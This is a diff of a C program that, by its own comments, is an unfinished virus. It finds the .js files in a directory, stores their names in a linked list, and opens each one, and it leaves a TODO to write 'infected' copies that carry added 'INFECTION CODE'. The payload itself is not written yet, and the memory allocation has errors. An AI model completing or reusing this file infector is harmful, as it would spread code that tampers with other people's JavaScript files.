@@ -13,7 +13,7 @@
 
 typedef struct node
 {
-	char* word;
+	char* name;
 	struct node* next;
 }
 node;
@@ -29,6 +29,7 @@ int isCorrectFile(char* file, char* extension); //find string inside another
 int main()
 {
 	FILE** files;
+	int filescounter = 0;
 	
 	//names array used to get the files with the .js extensions to infect
 	char **names = getdirectoryentries();
@@ -36,28 +37,27 @@ int main()
 
 	for (int i = 0; names[i] != NULL; i++)
 	{
-
 		if (isCorrectFile(names[i], ".js") >= 0)
 		{
 		    //copying the names of the javascript files into the linked list
-			node* tmp = malloc(sizeof(tmp));
+			filescounter++;
+			node* tmp = malloc(sizeof(node*));
 
-			if (tmp = NULL)	
+			if (tmp == NULL)	
 			{
 				fprintf(stderr, "Error allocating memory");
 				return -1;
 			}
-
 			node* tmp2 = head;
-			tmp->word = malloc(strlen(names[i]) * sizeof(tmp->word));
+			tmp->name = malloc(strlen(names[i]) * sizeof(tmp->name));
 
-			if (tmp->word == NULL)
+			if (tmp->name == NULL)
 			{
 				fprintf(stderr, "Error allocating memory");
 				return -1;
 			}
 			
-			strcpy(tmp->word, names[i]);
+			strcpy(tmp->name, names[i]);
 
 			if (head == NULL)
 			{
@@ -79,6 +79,19 @@ int main()
 	for (int i = 0; names[i] != NULL; i++)	free(names[i]);
 	free(names);
 
+//  ARRAY OF FILES TO BE INFECTION (THE LINKED LIST IS NO LONGER NEEDED AND CAN THUS BE FREED) TODO: ADD ERROR CHECKING
+	files = malloc(filescounter * sizeof(files));
+	node* tmp = head;
+
+	for(int i = 0; i < filescounter; i++)
+	{
+		*(files+i) = fopen(tmp->name, "r");
+		tmp = tmp->next;	
+	}
+//  TODO: FREE LINKED LIST
+
+
+//  TODO: ADD THE NEW INFECTED FILES (READ FROM FILES 2D ARRAY AND WRITE TO NEW FILES WITH SAME NAME + INFECTED AND ADD INFECTION CODE)	
 	return 0;
 }
 
